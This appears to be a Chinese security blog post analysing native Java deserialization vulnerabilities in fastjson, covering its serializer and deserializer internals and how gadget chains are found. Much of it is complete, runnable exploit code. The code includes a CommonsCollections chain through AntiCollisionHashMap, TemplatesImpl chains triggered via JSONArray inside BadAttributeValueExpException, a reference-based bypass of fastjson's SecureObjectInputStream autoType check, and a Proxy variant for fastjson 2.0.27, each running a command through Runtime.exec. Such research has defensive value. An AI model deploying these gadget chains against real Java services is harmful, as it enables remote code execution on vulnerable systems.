@@ -1,0 +1,632 @@
+---
+layout: post
+title:  "fastjson中的原生反序列化漏洞"
+excerpt: "fastjson中的原生反序列化漏洞"
+date:   2026-02-04 15:30:00
+author: "lcc"
+tags:
+  - java
+  - 反序列化
+categories:
+  - web安全
+---
+
+# fastjson中的原生反序列化漏洞
+
+要找fastjson中的原生反序列化漏洞，首先找支持序列化的类，以下类支持序列化（1.2.68版本）：
+
+```
+com/alibaba/fastjson/serializer/SerializerFeature[Serializable]
+com/alibaba/fastjson/asm/TypeCollector$1[Serializable]
+com/alibaba/fastjson/util/AntiCollisionHashMap[Serializable]
+com/alibaba/fastjson/JSONException[Serializable]
+com/alibaba/fastjson/PropertyNamingStrategy[Serializable]
+com/alibaba/fastjson/JSONPathException[Serializable]
+com/alibaba/fastjson/JSONValidator$Type[Serializable]
+com/alibaba/fastjson/parser/Feature[Serializable]
+com/alibaba/fastjson/JSONPath$Operator[Serializable]
+com/alibaba/fastjson/JSONArray[Serializable]
+com/alibaba/fastjson/JSONObject[Serializable]
+```
+
+
+
+然后找这些类是否重写readObject：
+
+```
+com/alibaba/fastjson/util/AntiCollisionHashMap[Serializable]
+com/alibaba/fastjson/JSONArray[Serializable]
+com/alibaba/fastjson/JSONObject[Serializable]
+```
+
+
+
+
+
+接着在readObject中看是否存在某些调用，比如AntiCollisionHashMap：
+
+![image-20251105063406832](assets/images/web_sec/image-20251105063406832.png)
+
+![image-20251105063500516](assets/images/web_sec/image-20251105063500516.png)
+
+
+
+看到hashcode基本确定可以结合CC链，以下是payload（jdk8u6+CommonsCollections3.1）：
+
+```java
+package org.example.CommonsCollections;
+
+import com.alibaba.fastjson.util.AntiCollisionHashMap;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.*;
+import org.example.tools.DeserializationTools;
+
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+
+
+public class CommonsCollections {
+    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, ClassNotFoundException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
+                        new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
+                        new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class},
+                        new String[]{"calc.exe"})
+        };
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map<String, Object> innerMap = new HashMap<>();
+        Map<String, Object> lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "test-key");
+        Field field = entry.getClass().getDeclaredField("map");
+        field.setAccessible(true);
+        field.set(entry, new AntiCollisionHashMap());
+        AntiCollisionHashMap antiCollisionHashMap = new AntiCollisionHashMap();
+        antiCollisionHashMap.put(entry, 1);
+        field.set(entry, lazyMap);
+
+        String s = DeserializationTools.serializeToHex(antiCollisionHashMap);
+        System.out.println(s);
+
+        DeserializationTools.deserializeFromHex(s);
+
+    }
+}
+```
+
+
+
+
+
+再看JSONObject，在readObject中会调用map.entrySet()：
+
+![image-20251106012538013](assets/images/web_sec/image-20251106012538013.png)
+
+但是lazyMap并没有重写entrySet，那就考虑能否用其他重写了entrySet并调用了map.get方法的map来封装下lazyMap，但实际上并没有找到这样的map。
+
+然后发现JSONObject实现了InvocationHandler，因此去看了下invoke方法：
+
+![image-20251107045044649](assets/images/web_sec/image-20251107045044649.png)
+
+如果可以走到map.get，当map等于lazyMap，那不就可以了吗，但实际上即便绕过了SecureObjectInputStream的检查也做不到，因为反序列化时entrySet方法参数类型数组长度为0，name这块也对方法名做了限制。
+
+到了这一步，其实基于lazyMap的漏洞链已经用不了了。
+
+<hr>
+
+
+fastjson的反序列化机制：
+
+fastjson使用parseObject去做反序列化时会获取指定类型的反序列化器：
+
+![image-20251107174659446](assets/images/web_sec/image-20251107174659446.png)
+
+实际反序列化时会走JavaBeanDeserializer和其他Deserializer，反序列化器会与类型做一个绑定，这样才能够根据类型选择特定的反序列化器来进行反序列化。
+
+fastjson是在ParseConfig中完成这些的：
+
+- initDeserializers中做反序列化器的静态绑定，是固定的映射关系
+- getDeserializer中做反序列化器的动态绑定，fastjson中内置了反序列化器，因此在动态绑定时首先根据条件绑定这些内置的反序列化器，如果没选到内置的反序列化器就使用createJavaBeanDeserializer创建反序列化器
+
+在createJavaBeanDeserializer中又有以下几条路径去创建反序列化器：
+
+- 如果类存在JSONType注解，就提取其中的反序列化器类型创建反序列化器，形式如`@JSONType(deserializer = xxx.class)`
+
+  ![image-20251107181503743](assets/images/web_sec/image-20251107181503743.png)
+
+- 如果没启用asm字节码技术就返回JavaBeanDeserializer
+
+  ![image-20251107182446678](assets/images/web_sec/image-20251107182446678.png)
+
+- 最后才是通过asmFactory去创建继承自JavaBeanDeserializer的反序列化器：
+
+  ![image-20251107182559540](assets/images/web_sec/image-20251107182559540.png)
+
+  ![image-20251107184835309](assets/images/web_sec/image-20251107184835309.png)
+
+JavaBeanDeserializer的组成如下：
+
+- 构造方法
+- deserialze：相当于readObject，用来做反序列化
+
+上面的代码中：
+
+- `_init`：构造函数
+- `_createInstance`：createInstance函数，根据javaBeanInfo 创建JavaBean对象，就是根据类信息创建类对象
+- `_deserialze`：deserialze函数，用于反序列化
+- `_deserialzeArrayMapping`：deserialzeArrayMapping函数，将 JSON 数组结构映射为 JavaBean 对象
+
+beanInfo在此构造：
+
+![image-20251107211828410](assets/images/web_sec/image-20251107211828410.png)
+
+`build`方法写的比较复杂，比较关键的部分是构建FieldInfo（存储属性和对应的方法）的方式，以下是构建FieldInfo时涉及的两种方式：
+
+- 如果方法存在JSONField注解，就通过注解去new FieldInfo：从方法的JSONField注解提取属性名，然后使用属性名和方法new FieldInfo
+
+  ![image-20251108013054672](assets/images/web_sec/image-20251108013054672.png)
+
+  ![image-20251108013453141](assets/images/web_sec/image-20251108013453141.png)
+
+- 不存在SONField注解的情况下就通过以下代码去设置当前method的propertyName
+
+  ![image-20251108021325045](assets/images/web_sec/image-20251108021325045.png)
+
+  
+
+反序列化时使用BeanInfo为字段赋值在这：
+
+![image-20251107221329941](assets/images/web_sec/image-20251107221329941.png)
+
+如果字段存在set方法，那么就调用set方法赋值，否则直接对字段赋值
+
+![image-20251107221708995](assets/images/web_sec/image-20251107221708995.png)
+
+ 
+
+
+
+fastjson的序列化机制类似，他的动态创建序列化器在这，sortedFields即存储属性和对应get、set方法的变量
+
+：
+
+![image-20251107214548528](assets/images/web_sec/image-20251107214548528.png)
+
+
+
+构建BeanInfo的位置在TypeUtils中的buildBeanInfo，它通过computeGetters去计算get方法：
+
+![](assets/images/web_sec/image-20251109001903132.png)
+
+方式同样两种，但不管怎么样，只会提取get和is开头的方法：
+
+![image-20251109002952943](assets/images/web_sec/image-20251109002952943.png)
+
+
+
+前面通过方法名计算属性名，但是怎么确定属性名是对的呢，在ParserConfig中存在一个函数，序列化时用的就是这个函数：
+
+![image-20251109022316452](assets/images/web_sec/image-20251109022316452.png)
+
+fieldCacheMap存储着正确的属性名与对应的Field的映射，当不能借助propertyName找到Field时，就会对propertyName做些转换后再进行查找，比如：
+
+- 最前面插入`_`后查找
+- 最前面插入`m`后查找
+- 首字母小写时转换为大写后查找
+- 前两个字母大写时就忽视大小写进行查找
+
+
+
+反序列化时用的另一个函数getField：
+
+![image-20251109025002512](assets/images/web_sec/image-20251109025002512.png)
+
+当没从declaredFields中找到propertyName对应的Field时，就会无视大小写进行匹配
+
+
+
+【总结1】1.2.68版本的fastjson在创建类特定的ASM序列化器和ASM反序列化器时，构建的方法和属性的映射规则分别如下：
+
+- 反序列化器：
+  - methodName[3]大写，propertyName=lower(methodName[3])+methodName[4:]
+  - methodName[3]='_'，propertyName=methodName[4:]
+  - methodName[3]='f'，propertyName=methodName[3:]
+  - methodName[3]和methodName[4]都是大写，propertyName=methodName[3:]
+- 序列化器：与反序列化器基本相同，不同的是限制了方法开头为is或get
+
+【总结2】1.2.68版本的fastjson选择反序列化器和序列化器的方式：
+
+- 反序列化器（所有反序列化器映射存在ParseConfig的deserializers）：在ParseConfig中的getDeserializer进行选择，先根据类的类型选择已有的反序列化器，如果没有就调用createJavaBeanDeserializer去创建，在创建的时候先从JSONType注解去创建，没JSONType注解就使用ASM动态创建以JavaBeanDeserializer为父类的反序列化器
+- 序列化器（所有序列化器映射存在SerializeConfig的serializers）：在SerializeConfig中的getObjectWriter进行选择，先根据类的类型选择已有的序列化器，如果没有就调用createJavaBeanSerializer去动态创建序列化器，要么根据JSONType注解去创建，要么使用ASM动态创建以JavaBeanSerializer为父类的序列化器
+
+使用JavaBeanSerializer序列化器在序列化时会自动调用get方法，使用JavaBeanDeserializer反序列化时会自动调用set方法，因为他们都使用FieldInfo的get或set方法获取或设置属性值，method即属性对应的set或get方法：
+
+![image-20251109011827061](assets/images/web_sec/image-20251109011827061.png)
+
+
+
+<hr>
+使用JavaBeanSerializer序列化时会调用属性的get方法，使用JavaBeanDeserializer反序列化时会调用属性的set方法，由于存在方法调用，如果方法是恶意方法，那么就可以触发漏洞，基于此开始找类来构造利用链了，类的要求为：
+
+
+- 类支持序列化
+- 序列化类时需要创建对应的asm序列化器
+- 类存在属性和方法的映射，这个映射必须可以在fastjson中构造，即能够使用计算出的属性名找到特定的方法
+- 方法存在危险调用
+
+TemplatesImp满足这些要求：
+
+- 支持序列化
+- 能够走到创建asm序列化器
+- `_outputProperties`字段在fastjson序列化中可以映射到`getOutputProperties`
+- `getOutputProperties`中存在危险调用
+
+fastjson中的序列化依靠ObjectSerializer.write的实现完成，找到fastjson的序列化函数去序列化恶意TemplatesImp对象，比如toJSON：
+
+```java
+package org.example.deserialization;
+import com.alibaba.fastjson.JSON;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import org.example.tools.ReflectionUtils;
+
+import java.io.IOException;
+
+public class fastjsonDemo {
+    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException {
+        TemplatesImpl templatesImp = new TemplatesImpl();
+
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass cc = pool.makeClass("EvilClass" + System.nanoTime());
+
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
+
+        cc.makeClassInitializer().insertBefore(cmd);
+
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+
+        byte[] evilCode = cc.toBytecode();
+
+        ReflectionUtils.setFieldValue(templatesImp, "_bytecodes", new byte[][]{evilCode});
+        ReflectionUtils.setFieldValue(templatesImp, "_name", "test");
+        ReflectionUtils.setFieldValue(templatesImp, "_tfactory", new TransformerFactoryImpl());
+
+        JSON.toJSON(templatesImp);
+        //JSON.toJSONString(templatesImp);
+
+    }
+}
+
+```
+
+成功触发计算器，接着要进一步构造链，找到一个类，要求在反序列化时能够直接或间接调用toJSON或toJSONString，在深度为2时，当前环境下只找到一条符合条件的被调用链：
+
+```
+被调用链 #347（节点数：3） ---
+    类模块：非本地模块
+    com.alibaba.fastjson.JSON.toJSONString(-1)
+        类模块：非本地模块
+        com.alibaba.fastjson.JSON.toString(com.alibaba.fastjson.JSON.class:967)
+            类模块：非本地模块
+            类特性：[Serializable][public]
+            javax.management.BadAttributeValueExpException.readObject(.javax.management.BadAttributeValueExpException.class:86)
+```
+
+于是进一步构造：
+
+```java
+package org.example.deserialization;
+import com.alibaba.fastjson.JSONArray;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import org.example.tools.DeserializationTools;
+import org.example.tools.ReflectionUtils;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.IOException;
+
+public class fastjsonDemo {
+    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException, ClassNotFoundException {
+        TemplatesImpl templatesImp = new TemplatesImpl();
+
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass cc = pool.makeClass("EvilClass" + System.nanoTime());
+
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
+
+        cc.makeClassInitializer().insertBefore(cmd);
+
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+
+        byte[] evilCode = cc.toBytecode();
+
+        ReflectionUtils.setFieldValue(templatesImp, "_bytecodes", new byte[][]{evilCode});
+        ReflectionUtils.setFieldValue(templatesImp, "_name", "test");
+        ReflectionUtils.setFieldValue(templatesImp, "_tfactory", new TransformerFactoryImpl());
+
+//        JSON.toJSON(templatesImp);
+//        JSON.toJSONString(templatesImp);
+
+
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templatesImp);
+        BadAttributeValueExpException badExp = new BadAttributeValueExpException(null);
+
+        ReflectionUtils.setFieldValue(badExp, "val", jsonArray);
+        String s = DeserializationTools.serializeToHex(badExp);
+        System.out.println(s);
+        DeserializationTools.deserializeFromHex(s);
+
+    }
+}
+
+```
+
+但是报错：
+
+```
+Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+	at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:1358)
+	at com.alibaba.fastjson.JSONObject$SecureObjectInputStream.resolveClass(JSONObject.java:574)
+	at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1613)
+	at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1518)
+	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1774)
+	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
+	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
+	at java.util.ArrayList.readObject(ArrayList.java:791)
+```
+
+是被SecureObjectInputStream.resolveClass拦截了，找了下资料（https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/）发现可以借助引用绕过resolveClass检查，得到：
+
+```java
+package org.example.deserialization;
+import com.alibaba.fastjson.JSONArray;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import org.example.tools.DeserializationTools;
+import org.example.tools.ReflectionUtils;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.IOException;
+import java.util.ArrayList;
+
+public class fastjsonDemo {
+    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException, ClassNotFoundException {
+        TemplatesImpl templatesImp = new TemplatesImpl();
+
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass cc = pool.makeClass("EvilClass" + System.nanoTime());
+
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
+
+        cc.makeClassInitializer().insertBefore(cmd);
+
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+
+        byte[] evilCode = cc.toBytecode();
+
+        ReflectionUtils.setFieldValue(templatesImp, "_bytecodes", new byte[][]{evilCode});
+        ReflectionUtils.setFieldValue(templatesImp, "_name", "test");
+        ReflectionUtils.setFieldValue(templatesImp, "_tfactory", new TransformerFactoryImpl());
+
+//        JSON.toJSON(templatesImp);
+//        JSON.toJSONString(templatesImp);
+
+        ArrayList<Object> list = new ArrayList<Object>();
+        list.add(templatesImp);
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templatesImp);
+        BadAttributeValueExpException badExp = new BadAttributeValueExpException(null);
+
+        ReflectionUtils.setFieldValue(badExp, "val", jsonArray);
+        list.add(badExp);
+        String s = DeserializationTools.serializeToHex(list);
+        System.out.println(s);
+        DeserializationTools.deserializeFromHex(s);
+
+    }
+}
+
+```
+
+存在对象A和B，其中A是B的字段a的值，使用ArrayList按顺序存储A、B，ArrayList的序列化和反序列化过程如下：
+
+- 序列化A时正常写入，序列化B时先序列化其他字段，当序列化到字段a时，序列化机制会识别到 A 已被序列化过，所以不再重复写入
+- 反序列化A时根据流中 A 的完整数据创建新对象，反序列化B时，其他字段正常反序列化，当反序列化到a时，会得到一个引用标识，然后创建到前面对象的引用
+
+
+
+因此当反序列化到badExp中的jsonArray时，反序列化的是一个引用类型对象，而引用类型是不会触发检查的
+
+
+
+
+
+
+【总结3】：
+
+在寻找fastjson的原生反序列化漏洞时可以基于以下思路：
+
+- 以readObject中成员的函数调用为source，以其他链的触发点（如lazyMap.get)为sink，找到的一条调用链，比如AntiCollisionHashMap与CC链结合得到的利用链
+- 以fastjson的get或set来做source到sink的中转
+
+fastjson的原生反序列化漏洞本质上就是由于存在可以被用户控制的方法调用。
+
+反序列化漏洞分析来分析去，关注的重点就两个：
+
+- 找sink（lazyMap.get这样的漏洞触发点），找source（反序列化时必然进入的入口），找中转节点
+- sink必然会实例化恶意类（加载恶意字节码）、调用恶意方法（方法名可控或能选择恶意方法）或触发其他类型的漏洞
+
+
+
+
+
+
+
+# POC
+
+
+
+### jdk8u66
+
+```java
+package org.example.deserialization;
+import com.alibaba.fastjson.JSONArray;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import org.example.tools.DeserializationTools;
+import org.example.tools.ReflectionUtils;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.IOException;
+import java.util.ArrayList;
+
+public class fastjsonDemo {
+    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException, ClassNotFoundException {
+        TemplatesImpl templatesImp = new TemplatesImpl();
+
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass cc = pool.makeClass("EvilClass" + System.nanoTime());
+
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
+
+        cc.makeClassInitializer().insertBefore(cmd);
+
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+
+        byte[] evilCode = cc.toBytecode();
+
+        ReflectionUtils.setFieldValue(templatesImp, "_bytecodes", new byte[][]{evilCode});
+        ReflectionUtils.setFieldValue(templatesImp, "_name", "test");
+        ReflectionUtils.setFieldValue(templatesImp, "_tfactory", new TransformerFactoryImpl());
+
+//        JSON.toJSON(templatesImp);
+//        JSON.toJSONString(templatesImp);
+
+        ArrayList<Object> list = new ArrayList<Object>();
+        list.add(templatesImp);
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(templatesImp);
+        BadAttributeValueExpException badExp = new BadAttributeValueExpException(null);
+
+        ReflectionUtils.setFieldValue(badExp, "val", jsonArray);
+        list.add(badExp);
+        String s = DeserializationTools.serializeToHex(list);
+        System.out.println(s);
+        DeserializationTools.deserializeFromHex(s);
+
+    }
+}
+
+```
+
+
+
+#### TemplatesImpl
+
+
+
+#### Templates  Proxy （fastjson 2.0.27可用）
+
+```java
+package org.example.deserialization;
+import com.alibaba.fastjson.JSONArray;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import org.example.tools.DeserializationTools;
+import org.example.tools.ProxyUtil;
+import org.example.tools.ReflectionUtils;
+
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.io.IOException;
+import java.lang.reflect.Proxy;
+import java.util.ArrayList;
+
+public class fastjsonDemo {
+    public static void main(String[] args) throws CannotCompileException, NotFoundException, IOException, ClassNotFoundException {
+        TemplatesImpl templatesImp = new TemplatesImpl();
+
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass cc = pool.makeClass("EvilClass" + System.nanoTime());
+
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
+
+        cc.makeClassInitializer().insertBefore(cmd);
+
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+
+        byte[] evilCode = cc.toBytecode();
+
+        ReflectionUtils.setFieldValue(templatesImp, "_bytecodes", new byte[][]{evilCode});
+        ReflectionUtils.setFieldValue(templatesImp, "_name", "test");
+        ReflectionUtils.setFieldValue(templatesImp, "_tfactory", new TransformerFactoryImpl());
+
+        Proxy proxy = (Proxy) ProxyUtil.getBProxy(templatesImp, new Class[]{Templates.class});
+        ArrayList<Object> list = new ArrayList<Object>();
+
+        list.add(proxy);
+
+
+        JSONArray jsonArray = new JSONArray();
+        jsonArray.add(proxy);
+
+        BadAttributeValueExpException badExp = new BadAttributeValueExpException(null);
+
+        ReflectionUtils.setFieldValue(badExp, "val", jsonArray);
+        list.add(badExp);
+        String s = DeserializationTools.serializeToHex(list);
+        System.out.println(s);
+        DeserializationTools.deserializeFromHex(s);
+
+    }
+}
+
+```
+
+
+
+### jdk 17
